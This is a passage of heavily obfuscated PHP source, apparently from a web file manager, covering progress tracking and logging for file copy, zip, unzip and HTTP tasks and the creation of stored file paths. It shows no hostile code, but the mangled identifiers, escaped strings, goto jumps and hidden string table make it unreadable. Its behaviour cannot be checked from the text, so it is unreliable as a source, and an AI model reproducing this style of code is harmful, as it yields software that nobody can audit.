Hook::unbind($’Ï£ˆ²[647], array($this, $’Ï£ˆ²[1839])); Hook::unbind($’Ï£ˆ²[649], array($this, $’Ï£ˆ²[1839])); Hook::unbind($’Ï£ˆ²[651], array($this, $’Ï£ˆ²[1839])); Hook::unbind($’Ï£ˆ²[1840], array($this, $’Ï£ˆ²[1841])); Hook::unbind($’Ï£ˆ²[667], array($this, $’Ï£ˆ²[1842])); Hook::unbind($’Ï£ˆ²[1843], array($this, $’Ï£ˆ²[1844])); Hook::unbind($’Ï£ˆ²[1845], array($this, $’Ï£ˆ²[1846])); Hook::unbind($’Ï£ˆ²[1847], array($this, $’Ï£ˆ²[1848])); } public function copyMoveStart($ã‡ËÙ„…, $á½¡úáœ, $½Ö¥­“, $¿‰¯ûßŞ) { $şù¤Ò =& $_SERVER[ÅÄÇĞô]; self::log($şù¤Ò[1858] . $á½¡úáœ . $şù¤Ò[73] . $¿‰¯ûßŞ); $æ’ï·œ§ = rtrim(TEMP_FILES, $şù¤Ò[8]); if (substr($á½¡úáœ, 0, strlen($æ’ï·œ§)) == $æ’ï·œ§) { return; } if (substr($¿‰¯ûßŞ, 0, strlen($æ’ï·œ§)) == $æ’ï·œ§) { return; } $Çñ—ºµµ =& $this->task; $Çñ—ºµµ[$şù¤Ò[1859]] = KodIO::transferType($ã‡ËÙ„…, $½Ö¥­“); $this->update(); } public function updateAfter() { $ôŞ…Óô =& $_SERVER[ÅÄÇĞô]; $ ½±•ù½ =& $this->task; if (!$ ½±•ù½[$ôŞ…Óô[858]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ ½±•ù½[$ôŞ…Óô[1859]] == $ôŞ…Óô[1425]) { return; } self::updateTask($ ½±•ù½); } private static function updateTask(&$Ö¦«ôÜÎ) { $ÅÓÁÍÒÒ =& $_SERVER[ÅÄÇĞô]; if ($Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[1859]] == $ÅÓÁÍÒÒ[1302] || $Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[1859]] == $ÅÓÁÍÒÒ[110]) { if ($Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[1853]]) { $Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[1856]] = $Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[1855]] + $Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[1852]]; } } else { if ($Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[1859]] == $ÅÓÁÍÒÒ[1426]) { if ($Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[1853]] == $ÅÓÁÍÒÒ[1302]) { $Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[1856]] = $Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[1855]] + $Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[1852]] * 0.5; } else { if ($Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[1853]] == $ÅÓÁÍÒÒ[110]) { $Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[1856]] = $Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[1855]] + $Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[1851]] * 0.5 + $Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[1852]] * 0.5; } } } } $Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[1799]] = $Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[1856]] / $Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[858]]; if ($Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[1799]] > 0) { $¡·—î¥£ = timeFloat() - $Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[1801]] - $Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[1804]]; $Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[1805]] = $¡·—î¥£ * (1 - $Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[1799]]) / $Ö¦«ôÜÎ[$ÅÓÁÍÒÒ[1799]]; } } public function addPath($ÎÇ¢Ÿ‹“) { $ï§îî¹° =& $_SERVER[ÅÄÇĞô]; if (!$ÎÇ¢Ÿ‹“) { return; } $ĞúÉÂ— =& $this->task; $ı§‹Å ¶ = IO::infoWithChildren($ÎÇ¢Ÿ‹“); $ì®™¡¦ = $ĞúÉÂ—[$ï§îî¹°[1860]] ? $ĞúÉÂ—[$ï§îî¹°[1860]][$ï§îî¹°[1861]] : 0; $ĞúÉÂ—[$ï§îî¹°[1860]] = array($ï§îî¹°[1861] => $ì®™¡¦ + 1, $ï§îî¹°[497] => $ı§‹Å ¶[$ï§îî¹°[32]], $ï§îî¹°[87] => $ı§‹Å ¶[$ï§îî¹°[87]], $ï§îî¹°[587] => $ı§‹Å ¶[$ï§îî¹°[587]] ? $ı§‹Å ¶[$ï§îî¹°[587]] : $ı§‹Å ¶[$ï§îî¹°[87]]); if ($ı§‹Å ¶[$ï§îî¹°[33]] == $ï§îî¹°[233]) { $ĞúÉÂ—[$ï§îî¹°[1163]] += 1; } else { $ĞúÉÂ—[$ï§îî¹°[1163]] += $ı§‹Å ¶[$ï§îî¹°[82]][$ï§îî¹°[80]]; if ($ı§‹Å ¶[$ï§îî¹°[194]]) { $ĞúÉÂ—[$ï§îî¹°[1163]] += $ı§‹Å ¶[$ï§îî¹°[82]][$ï§îî¹°[81]] + 1; } } $ĞúÉÂ—[$ï§îî¹°[858]] += $ı§‹Å ¶[$ï§îî¹°[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($É§ ³‰·) { } public function sourceAddHashEnd($ÒÊ¯Ïï®) { } public function sourceAddFileStart($Öú±Æ„) { $‰ªöÏÁ› =& $_SERVER[ÅÄÇĞô]; $Å¬üÛì§ =& $this->task; $Å¬üÛì§[$‰ªöÏÁ›[1851]] = $Öú±Æ„[$‰ªöÏÁ›[79]]; $Å¬üÛì§[$‰ªöÏÁ›[1849]] = $Öú±Æ„[$‰ªöÏÁ›[32]]; $Å¬üÛì§[$‰ªöÏÁ›[1165]] = $Öú±Æ„[$‰ªöÏÁ›[32]]; $Å¬üÛì§[$‰ªöÏÁ›[1862]] = $Öú±Æ„[$‰ªöÏÁ›[87]]; $this->update(); } public function sourceAddFileEnd($ÔøƒñÖ) { $ã²¶¬¸Ê =& $_SERVER[ÅÄÇĞô]; $×Í­¯…µ =& $this->task; $×Í­¯…µ[$ã²¶¬¸Ê[1856]] += $ÔøƒñÖ[$ã²¶¬¸Ê[79]]; $×Í­¯…µ[$ã²¶¬¸Ê[1862]] = $ÔøƒñÖ[$ã²¶¬¸Ê[87]]; $this->update(1); } public function copyFileStart($Ò˜’ªé, $—¹ÓÌŒ¸, $Ó½²»¬É, $¸Ğ‹Ğë, $ÅÚÀë¿Ú, $İæıîº) { $Ñò­ÄÈ÷ =& $_SERVER[ÅÄÇĞô]; $Í•Şå«‡ = $ÅÚÀë¿Ú; if ($Í•Şå«‡ == $GLOBALS[$Ñò­ÄÈ÷[1863]]) { $Í•Şå«‡ = $GLOBALS[$Ñò­ÄÈ÷[1864]]; } $GLOBALS[$Ñò­ÄÈ÷[1864]] = $ÅÚÀë¿Ú; $GLOBALS[$Ñò­ÄÈ÷[1863]] = $İæıîº; $¤åœ„Ã› =& $this->task; $¤åœ„Ã›[$Ñò­ÄÈ÷[1849]] = $Í•Şå«‡; $¤åœ„Ã›[$Ñò­ÄÈ÷[1851]] = (int) $Ò˜’ªé->size($—¹ÓÌŒ¸); $¤åœ„Ã›[$Ñò­ÄÈ÷[1852]] = 0; $¤åœ„Ã›[$Ñò­ÄÈ÷[1165]] = $Ñò­ÄÈ÷[12]; $¤åœ„Ã›[$Ñò­ÄÈ÷[1853]] = $Ñò­ÄÈ÷[12]; $¤åœ„Ã›[$Ñò­ÄÈ÷[1854]] = 0; $¿‚¬ÀÁ = $¤åœ„Ã›[$Ñò­ÄÈ÷[1851]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($¤åœ„Ã›[$Ñò­ÄÈ÷[478]] . $Ñò­ÄÈ÷[1865]); if ($¿‚¬ÀÁ && file_exists(get_path_father($¸Ğ‹Ğë))) { Cache::set($¤åœ„Ã›[$Ñò­ÄÈ÷[478]] . $Ñò­ÄÈ÷[1865], $¸Ğ‹Ğë); $¤åœ„Ã›[$Ñò­ÄÈ÷[1822]] = array($Ñò­ÄÈ÷[1866], $Ñò­ÄÈ÷[1867]); } $this->update(0, $¿‚¬ÀÁ); } public static function updateCopyLocalFileSize($¹²Ê¼èã) { $ğ€ü÷Û× =& $_SERVER[ÅÄÇĞô]; $©±å¾œš = Cache::get($¹²Ê¼èã[$ğ€ü÷Û×[478]] . $ğ€ü÷Û×[1865]); if (!$©±å¾œš || !file_exists($©±å¾œš)) { return $¹²Ê¼èã; } $¹²Ê¼èã[$ğ€ü÷Û×[1852]] = @filesize($©±å¾œš); $¹²Ê¼èã[$ğ€ü÷Û×[1856]] += $¹²Ê¼èã[$ğ€ü÷Û×[1852]]; self::updateTask($¹²Ê¼èã); return $¹²Ê¼èã; } public function copyFileEnd($íèÕ÷›², $®ö¥Ú†á, $ˆÁà‚¥, $ÒèÁÜ´›, $€çƒàû, $ÜôõŞî) { $»¼¦ˆ¼ =& $_SERVER[ÅÄÇĞô]; $ÃÍššŞ¬ =& $this->task; $ÃÍššŞ¬[$»¼¦ˆ¼[1852]] = $ÃÍššŞ¬[$»¼¦ˆ¼[1851]]; $ÃÍššŞ¬[$»¼¦ˆ¼[1853]] = $»¼¦ˆ¼[12]; unset($ÃÍššŞ¬[$»¼¦ˆ¼[1822]]); if ($€çƒàû == $ÃÍššŞ¬[$»¼¦ˆ¼[1849]]) { $ÃÍššŞ¬[$»¼¦ˆ¼[1855]] += $ÃÍššŞ¬[$»¼¦ˆ¼[1851]]; $ÃÍššŞ¬[$»¼¦ˆ¼[1856]] = $ÃÍššŞ¬[$»¼¦ˆ¼[1855]]; $Ü¸şñ = 1; if (isset($ÃÍššŞ¬[$»¼¦ˆ¼[1862]]) && $ÃÍššŞ¬[$»¼¦ˆ¼[1862]] == $®ö¥Ú†á) { $Ü¸şñ = 0; } $this->update($Ü¸şñ); } else { $this->update(); $ÃÍššŞ¬[$»¼¦ˆ¼[1852]] = 0; } Cache::remove($ÃÍššŞ¬[$»¼¦ˆ¼[478]] . $»¼¦ˆ¼[1865]); self::log($»¼¦ˆ¼[1868] . $®ö¥Ú†á . $»¼¦ˆ¼[73] . $ÒèÁÜ´› . $»¼¦ˆ¼[288] . $€çƒàû . $»¼¦ˆ¼[1869] . $ÃÍššŞ¬[$»¼¦ˆ¼[1849]]); } public function updateFileEnd($…ê“›í, $’°À±ˆó) { $ûïÖåŸÀ =& $_SERVER[ÅÄÇĞô]; $³Ó¢šĞ =& $this->task; $³Ó¢šĞ[$ûïÖåŸÀ[1849]] = $…ê“›í; $³Ó¢šĞ[$ûïÖåŸÀ[1851]] = $’°À±ˆó; $³Ó¢šĞ[$ûïÖåŸÀ[1855]] += $’°À±ˆó; $³Ó¢šĞ[$ûïÖåŸÀ[1856]] = $³Ó¢šĞ[$ûïÖåŸÀ[1855]]; $this->update(1); self::log($ûïÖåŸÀ[1870] . $…ê“›í); } public function sourceModelCopy($øñöÒåÓ) { $Éíº‘Ó =& $_SERVER[ÅÄÇĞô]; $ÖèÔÄÁ = $øñöÒåÓ[0]; $ñã “Æ = $øñöÒåÓ[1]; $ÌÊŒ—¸ =& $this->task; $this->sourceModelCopyFlag = !0; $Ä€„Èêì = 0; switch ($ÖèÔÄÁ) { case $Éíº‘Ó[643]: $Ä€„Èêì = 1; break; case $Éíº‘Ó[646]: $ÌÊŒ—¸[$Éíº‘Ó[1849]] = $ñã “Æ[$Éíº‘Ó[32]]; break; case $Éíº‘Ó[648]: $Ä€„Èêì = intval($øñöÒåÓ[$Éíº‘Ó[459]] * 0.4); break; case $Éíº‘Ó[650]: $Ä€„Èêì = intval($øñöÒåÓ[$Éíº‘Ó[459]] * 0.2); break; case $Éíº‘Ó[652]: $Ä€„Èêì = intval($øñöÒåÓ[$Éíº‘Ó[459]] * 0.4); break; } $this->update($Ä€„Èêì); $this->sourceModelCopyFlag = !1; } public function sourceRemove($û´™÷íÉ, $à¢ãäÆ¶) { $’¬ªÉšœ =& $_SERVER[ÅÄÇĞô]; $this->sourceModelCopyFlag = !0; $âõØîóí = 1; if (isset($û´™÷íÉ[$’¬ªÉšœ[82]])) { $âõØîóí = $û´™÷íÉ[$’¬ªÉšœ[82]][$’¬ªÉšœ[80]]; $âõØîóí = $âõØîóí + $û´™÷íÉ[$’¬ªÉšœ[82]][$’¬ªÉšœ[81]] + 1; } $this->update($âõØîóí); $this->sourceModelCopyFlag = !1; } public function sourceMove($¢½ÑüÀ) { $this->sourceRemove($¢½ÑüÀ, !1); } public function curlProgress($é šõÌ, $•àÀ“Ï·, $ÃĞù‘Æø, $ğ×µÖà, $”ª¸Ş¯) { $ñÌì€åÈ =& $_SERVER[ÅÄÇĞô]; $ù©ÎÜ´§ =& $this->task; if ($”ª¸Ş¯ > 0) { $ù©ÎÜ´§[$ñÌì€åÈ[1165]] = $ñÌì€åÈ[1871]; $ù©ÎÜ´§[$ñÌì€åÈ[1853]] = $ñÌì€åÈ[110]; if ($ù©ÎÜ´§[$ñÌì€åÈ[1851]]) { $ù©ÎÜ´§[$ñÌì€åÈ[1852]] = $”ª¸Ş¯; } if ($ù©ÎÜ´§[$ñÌì€åÈ[1854]]) { $ù©ÎÜ´§[$ñÌì€åÈ[1852]] = $”ª¸Ş¯ + $ù©ÎÜ´§[$ñÌì€åÈ[1854]]; } } else { if ($ÃĞù‘Æø > 0) { if ($ù©ÎÜ´§[$ñÌì€åÈ[1851]] == $•àÀ“Ï·) { $ù©ÎÜ´§[$ñÌì€åÈ[1852]] = $ÃĞù‘Æø; $ù©ÎÜ´§[$ñÌì€åÈ[1165]] = $ñÌì€åÈ[1872]; $ù©ÎÜ´§[$ñÌì€åÈ[1853]] = $ñÌì€åÈ[1302]; } } } $this->update(); } public function curlProgressStart($ë­¾õ½) { } public function curlProgressEnd($…àœ¯’¹) { $¸ÁĞ¯ùÃ =& $_SERVER[ÅÄÇĞô]; $ÄÅ’áÕ =& $this->task; $°Öê¤ÊÓ = curl_getinfo($…àœ¯’¹); $„¿¾³Ÿ = $°Öê¤ÊÓ[$¸ÁĞ¯ùÃ[1873]]; if ($„¿¾³Ÿ == -1) { $„¿¾³Ÿ = $°Öê¤ÊÓ[$¸ÁĞ¯ùÃ[1874]]; } if ($ÄÅ’áÕ[$¸ÁĞ¯ùÃ[1853]] == $¸ÁĞ¯ùÃ[110] && $„¿¾³Ÿ) { $ÄÅ’áÕ[$¸ÁĞ¯ùÃ[1854]] += $„¿¾³Ÿ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ï©Ì±Ì« =& $_SERVER[ÅÄÇĞô]; $¯ÀÊ¥¼é =& $this->task; $¯ÀÊ¥¼é[$ï©Ì±Ì«[1875]] = 1; Hook::bind($ï©Ì±Ì«[1843], array($this, $ï©Ì±Ì«[1876])); Hook::bind($ï©Ì±Ì«[1845], array($this, $ï©Ì±Ì«[1877])); Hook::bind($ï©Ì±Ì«[1847], array($this, $ï©Ì±Ì«[1878])); } protected function endAfter() { $…ößÚá÷ =& $_SERVER[ÅÄÇĞô]; Hook::unbind($…ößÚá÷[1843], array($this, $…ößÚá÷[1876])); Hook::unbind($…ößÚá÷[1845], array($this, $…ößÚá÷[1877])); Hook::unbind($…ößÚá÷[1847], array($this, $…ößÚá÷[1878])); } public function progressStart($Ïœñğïâ) { $ú‹€à¼š =& $_SERVER[ÅÄÇĞô]; $Ö©©èÙ„ = curl_getinfo($Ïœñğïâ); self::log($ú‹€à¼š[1879] . $Ö©©èÙ„[$ú‹€à¼š[385]]); self::valueSet($this->task[$ú‹€à¼š[478]], $this->task); } public function progressEnd($ŒßŠ“Ôà) { $“üö¾ëÓ =& $_SERVER[ÅÄÇĞô]; self::log($“üö¾ëÓ[1880] . $this->task[$“üö¾ëÓ[478]]); $this->end(); } public function progress($´Š¹…¹É, $¬ëØß·â, $¨µó¤âÃ, $œñï¤±Ï, $Ùèèñ’) { $ÄŠ›ÏÓ› =& $_SERVER[ÅÄÇĞô]; $‰±¢ıªº =& $this->task; if ($Ùèèñ’ > 0) { $‰±¢ıªº[$ÄŠ›ÏÓ›[1163]] = $‰±¢ıªº[$ÄŠ›ÏÓ›[1163]] == 0 ? $œñï¤±Ï : $‰±¢ıªº[$ÄŠ›ÏÓ›[1163]]; $‰±¢ıªº[$ÄŠ›ÏÓ›[1798]] = $Ùèèñ’; } else { if ($¨µó¤âÃ > 0) { $‰±¢ıªº[$ÄŠ›ÏÓ›[1163]] = $‰±¢ıªº[$ÄŠ›ÏÓ›[1163]] == 0 ? $¬ëØß·â : $‰±¢ıªº[$ÄŠ›ÏÓ›[1163]]; $‰±¢ıªº[$ÄŠ›ÏÓ›[1798]] = $¨µó¤âÃ; } } $this->update(); self::log("\x70\162\x6f\147\162\x65\x73\163\x48\164\164\160\72\144\x6f\167\156\72{$¨µó¤âÃ}\57{$¬ëØß·â}\73\x20\x75\x70\154\157\x61\144\72{$Ùèèñ’}\x2f{$œñï¤±Ï}\x3b"); } } goto f«§ğç—ëÅ; f«§ğç—ëÅ: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ñßŸÁ–…, $µ·“Û¨Õ = '', $ªèÊâÚ¡ = 0, $¤ƒÀ´õˆ = '') { $ĞŠ¿ƒ =& $_SERVER[ÅÄÇĞô]; $¤ƒÀ´õˆ = $¤ƒÀ´õˆ ? $¤ƒÀ´õˆ : ($µ·“Û¨Õ ? $µ·“Û¨Õ : $ñßŸÁ–…); $®í‰¶¯Ó = new Task($ñßŸÁ–…, $µ·“Û¨Õ, $ªèÊâÚ¡, $¤ƒÀ´õˆ); $GLOBALS[$ĞŠ¿ƒ[1881] . $ñßŸÁ–…] = new TaskLog($ĞŠ¿ƒ[1780], $®í‰¶¯Ó, $¤ƒÀ´õˆ); return $®í‰¶¯Ó; } public function __construct($ºÉ¤Ã¸ = '', $Ü”ÛÁï = '', $ „±‡øÛ = '') { $˜Û¯ßÛ =& $_SERVER[ÅÄÇĞô]; if (!$ºÉ¤Ã¸) { $ºÉ¤Ã¸ = $˜Û¯ßÛ[1780]; } $áÈµŸÄ’ = $ºÉ¤Ã¸ . $˜Û¯ßÛ[465] . rand_string(10); if (!$ „±‡øÛ) { $ „±‡øÛ = $ºÉ¤Ã¸ . $˜Û¯ßÛ[53] . $ „±‡øÛ; } switch ($ºÉ¤Ã¸) { case $˜Û¯ßÛ[1780]: if (!$Ü”ÛÁï || !$Ü”ÛÁï->task) { return echoLog($ºÉ¤Ã¸ . $˜Û¯ßÛ[1882]); } $¥Çıø¢„ = $Ü”ÛÁï; $áÈµŸÄ’ = $¥Çıø¢„->task[$˜Û¯ßÛ[478]]; $ºÉ¤Ã¸ = $¥Çıø¢„->task[$˜Û¯ßÛ[478]]; if (!$¥Çıø¢„->task[$˜Û¯ßÛ[1685]]) { $¥Çıø¢„->task[$˜Û¯ßÛ[1685]] = $ „±‡øÛ ? $ „±‡øÛ : $ºÉ¤Ã¸; } break; case $˜Û¯ßÛ[1883]: if (!$Ü”ÛÁï) { return echoLog($ºÉ¤Ã¸ . $˜Û¯ßÛ[1884]); } $•‰âõÂË = is_string($Ü”ÛÁï) ? array($Ü”ÛÁï) : $Ü”ÛÁï; $¥Çıø¢„ = new TaskFileTransfer($áÈµŸÄ’, $ºÉ¤Ã¸, 0, $ „±‡øÛ ? $ „±‡øÛ : $•‰âõÂË[0]); foreach ($•‰âõÂË as $‘ê©²ªÃ) { $¥Çıø¢„->addPath($‘ê©²ªÃ); } break; case $˜Û¯ßÛ[391]: if (!$Ü”ÛÁï) { return echoLog($ºÉ¤Ã¸ . $˜Û¯ßÛ[1884]); } $•‰âõÂË = is_string($Ü”ÛÁï) ? array($Ü”ÛÁï) : $Ü”ÛÁï; $¥Çıø¢„ = new TaskZip($áÈµŸÄ’, $ºÉ¤Ã¸, 0, $ „±‡øÛ ? $ „±‡øÛ : $•‰âõÂË[0]); foreach ($•‰âõÂË as $‘ê©²ªÃ) { $¥Çıø¢„->addPath($‘ê©²ªÃ); } break; case $˜Û¯ßÛ[1322]: if (!$Ü”ÛÁï) { return echoLog($ºÉ¤Ã¸ . $˜Û¯ßÛ[1884]); } $¥Çıø¢„ = new TaskUnZip($áÈµŸÄ’, $ºÉ¤Ã¸, 0, $ „±‡øÛ ? $ „±‡øÛ : $Ü”ÛÁï); if ($Ü”ÛÁï) { $¥Çıø¢„->addFile($Ü”ÛÁï); } break; case $˜Û¯ßÛ[152]: $¥Çıø¢„ = new TaskHttp($áÈµŸÄ’, $ºÉ¤Ã¸); break; default: return; break; } $this->task = $¥Çıø¢„; $this->taskID = $áÈµŸÄ’; Hook::bind($˜Û¯ßÛ[1818], array($this, $˜Û¯ßÛ[1885])); Hook::bind($˜Û¯ßÛ[1820], array($this, $˜Û¯ßÛ[1886])); Hook::bind($˜Û¯ßÛ[1814], array($this, $˜Û¯ßÛ[1887])); echoLog($˜Û¯ßÛ[1888] . $¥Çıø¢„->task[$˜Û¯ßÛ[1685]]); } public function __destruct() { $this->end(); } public function end($ææí½¡Ş = '') { $‡¢†ñŒÂ =& $_SERVER[ÅÄÇĞô]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ææí½¡Ş); $this->task = !1; $this->taskID = !1; Hook::unbind($‡¢†ñŒÂ[1818], array($this, $‡¢†ñŒÂ[1885])); Hook::unbind($‡¢†ñŒÂ[1820], array($this, $‡¢†ñŒÂ[1886])); Hook::unbind($‡¢†ñŒÂ[1814], array($this, $‡¢†ñŒÂ[1887])); } public function taskUpdate($µÀ¡İÏ“) { $àœ¾Ğ» =& $_SERVER[ÅÄÇĞô]; if (!$µÀ¡İÏ“ || $this->taskID != $µÀ¡İÏ“[$àœ¾Ğ»[478]]) { return; } $ôÇÕ­† = 20; $é¯ºòØş = intval($µÀ¡İÏ“[$àœ¾Ğ»[1799]] * $ôÇÕ­†); $Ú®¤¬ö = $àœ¾Ğ»[176] . str_repeat($àœ¾Ğ»[509], $é¯ºòØş) . $àœ¾Ğ»[1114] . str_repeat($àœ¾Ğ»[53], $ôÇÕ­† - $é¯ºòØş) . $àœ¾Ğ»[178]; $†Âé‹ßú = $Ú®¤¬ö . sprintf($àœ¾Ğ»[1889], $µÀ¡İÏ“[$àœ¾Ğ»[1799]] * 100) . $àœ¾Ğ»[1890]; $ëÃ·¾² = $†Âé‹ßú . $µÀ¡İÏ“[$àœ¾Ğ»[1798]] . $àœ¾Ğ»[8] . $µÀ¡İÏ“[$àœ¾Ğ»[1163]] . LNG($àœ¾Ğ»[1891]); $Úã¤ıª = $àœ¾Ğ»[12]; if ($µÀ¡İÏ“[$àœ¾Ğ»[1875]]) { $ëÃ·¾² = $†Âé‹ßú . size_format($µÀ¡İÏ“[$àœ¾Ğ»[1798]]) . $àœ¾Ğ»[8] . size_format($µÀ¡İÏ“[$àœ¾Ğ»[1163]]); $Úã¤ıª = size_format($µÀ¡İÏ“[$àœ¾Ğ»[1800]]) . $àœ¾Ğ»[1892]; } if ($µÀ¡İÏ“[$àœ¾Ğ»[1165]]) { $µÀ¡İÏ“[$àœ¾Ğ»[1849]] = $µÀ¡İÏ“[$àœ¾Ğ»[1165]] . $àœ¾Ğ»[53] . $µÀ¡İÏ“[$àœ¾Ğ»[1849]]; } if ($µÀ¡İÏ“[$àœ¾Ğ»[1849]]) { $à‘ë±ÜÙ = $àœ¾Ğ»[12]; if ($µÀ¡İÏ“[$àœ¾Ğ»[1851]]) { $à‘ë±ÜÙ = $àœ¾Ğ»[50] . size_format($µÀ¡İÏ“[$àœ¾Ğ»[1852]]) . $àœ¾Ğ»[8] . size_format($µÀ¡İÏ“[$àœ¾Ğ»[1851]]); } $Úã¤ıª .= $µÀ¡İÏ“[$àœ¾Ğ»[1849]] . $à‘ë±ÜÙ; } if ($µÀ¡İÏ“[$àœ¾Ğ»[858]] && !$µÀ¡İÏ“[$àœ¾Ğ»[1851]]) { $Úã¤ıª .= $àœ¾Ğ»[53] . size_format($µÀ¡İÏ“[$àœ¾Ğ»[1856]]) . $àœ¾Ğ»[8] . size_format($µÀ¡İÏ“[$àœ¾Ğ»[858]]); } echoLog($ëÃ·¾² . $àœ¾Ğ»[53] . $Úã¤ıª, !0); } public function taskEnd($ÌıŒì·ã) { $²²ÕãÏî =& $_SERVER[ÅÄÇĞô]; if (!$ÌıŒì·ã || $this->taskID != $ÌıŒì·ã[$²²ÕãÏî[478]]) { return; } $üô³Ä©‹ = $ÌıŒì·ã ? LNG($²²ÕãÏî[1893]) . $²²ÕãÏî[4] . $ÌıŒì·ã[$²²ÕãÏî[1798]] . $²²ÕãÏî[8] . $ÌıŒì·ã[$²²ÕãÏî[1163]] . LNG($²²ÕãÏî[1891]) . $²²ÕãÏî[74] : $²²ÕãÏî[12]; echoLog($²²ÕãÏî[1894] . $ÌıŒì·ã[$²²ÕãÏî[1685]] . ($ÌıŒì·ã[$²²ÕãÏî[529]] ? $²²ÕãÏî[74] . $ÌıŒì·ã[$²²ÕãÏî[529]] : $²²ÕãÏî[12]) . $²²ÕãÏî[74] . $üô³Ä©‹ . $²²ÕãÏî[1895] . sprintf($²²ÕãÏî[952], timeFloat() - $ÌıŒì·ã[$²²ÕãÏî[1801]]) . $²²ÕãÏî[1813]); $this->end(); } public function taskKill($ÍÉÕ€©Ú) { $û¿ÜŒıá =& $_SERVER[ÅÄÇĞô]; if (!$ÍÉÕ€©Ú || $this->taskID != $ÍÉÕ€©Ú[$û¿ÜŒıá[478]]) { return; } echoLog($û¿ÜŒıá[1896] . $ÍÉÕ€©Ú[$û¿ÜŒıá[1685]]); } } $_file = $_SERVER[$_SERVER[ÅÄÇĞô][835]]; $_size = $_SERVER[ÅÄÇĞô][836]; goto Dœõ²„Ğ”ß; d¿„Êßì‘: class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\x69\x6c\145\x5f\143\x6f\x6e\x74\145\156\x74\163"; protected $dataAuto = array(array("\x63\162\145\141\x74\145\x54\151\155\145", "\164\x69\x6d\145", "\151\x6e\x73\x65\x72\x74", "\146\x75\x6e\x63\x74\151\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\x66\x69\x6c\x65"; protected $tableMeta = array("\x74\141\142\x6c\145\116\x61\x6d\x65" => "\151\x6f\x5f\x66\x69\154\x65\x5f\155\x65\164\141", "\x6d\145\164\141\x46\151\x65\154\144" => "\x66\151\x6c\x65\x49\104"); public function fileInfo($¢Ëñè°÷) { $¹ßŒ…¥š =& $_SERVER[ÅÄÇĞô]; static $‚ø® = array(); if (!isset($‚ø®[$¢Ëñè°÷])) { $â·ïõ´ = $¹ßŒ…¥š[2048]; $™½ùø = Model($¹ßŒ…¥š[549])->field($â·ïõ´)->where(array($¹ßŒ…¥š[547] => $¢Ëñè°÷))->find(); $‚ø®[$¢Ëñè°÷] = $™½ùø; } return $‚ø®[$¢Ëñè°÷]; } public function addFileByContent($÷«¢ğå´ = '', $áÒ›¶ï× = '') { $ÄöØ÷Ê­ =& $_SERVER[ÅÄÇĞô]; $ö½¤û€« = TEMP_PATH . $ÄöØ÷Ê­[2049]; if (!is_dir($ö½¤û€«)) { mk_dir($ö½¤û€«); } $ó«¨¸×Æ = $ö½¤û€« . $ÄöØ÷Ê­[2050] . rand_string(16); $Ù‹ÌÒ©³ = file_put_contents($ó«¨¸×Æ, $÷«¢ğå´); if ($Ù‹ÌÒ©³ === !1 || strlen($÷«¢ğå´) != $Ù‹ÌÒ©³) { return !1; } $é ğ¯¦à = $this->addFile($ó«¨¸×Æ, $áÒ›¶ï×, !0); if (file_exists($ó«¨¸×Æ)) { @unlink($ó«¨¸×Æ); } return $é ğ¯¦à; } public function createFileName($¦ïô¨§î, $ç¢•¼Ù§ = false, $¥¾ëá’ = false) { $ù±­ÀÁ =& $_SERVER[ÅÄÇĞô]; $¤Í£½‰ = IO::init($ù±­ÀÁ[8]); $şıÈ º— = $this->makeFilePath($¦ïô¨§î, $¤Í£½‰, $ç¢•¼Ù§, $¥¾ëá’); $Øãù‰¶ë = $¤Í£½‰->pathFather($şıÈ º—); static $´¨ò§”ƒ = false; $Ç²¡—Ê¢ = $ù±­ÀÁ[2051] . md5($Øãù‰¶ë); if (!$´¨ò§”ƒ && !Cache::get($Ç²¡—Ê¢)) { $´¨ò§”ƒ = !0; $è©İşğ– = IO::mkdir($Øãù‰¶ë); if (!IO::exist($è©İşğ– . $ù±­ÀÁ[894])) { IO::mkfile($è©İşğ– . $ù±­ÀÁ[894]); } Cache::set($Ç²¡—Ê¢, 1, 3600 * 2); } return $şıÈ º—; } public function makeFilePath($òŠÄÜÇø, $ÖæÑ©ùò, $Õö™õû = false, $ãÜìô÷ = false) { $üíšö =& $_SERVER[ÅÄÇĞô]; $™ô¹¤£Î = Model($üíšö[865])->get($üíšö[2052]); $ÉèïæéÅ = KodIO::defaultIO() . date($üíšö[2053]); $¤•äİØÌ = $ÉèïæéÅ . rand_string(5) . short_id(100); $òŠÄÜÇø = str_replace($üíšö[8], $üíšö[11], KodIO::clear($òŠÄÜÇø)); $šÈ™ÓÖ… = $ÖæÑ©ùò->ext($òŠÄÜÇø); if (!$òŠÄÜÇø) { $™ô¹¤£Î = $üíšö[871]; } switch ($™ô¹¤£Î) { case $üíšö[2054]: if ($šÈ™ÓÖ…) { $¤•äİØÌ = $¤•äİØÌ . $üíšö[10] . 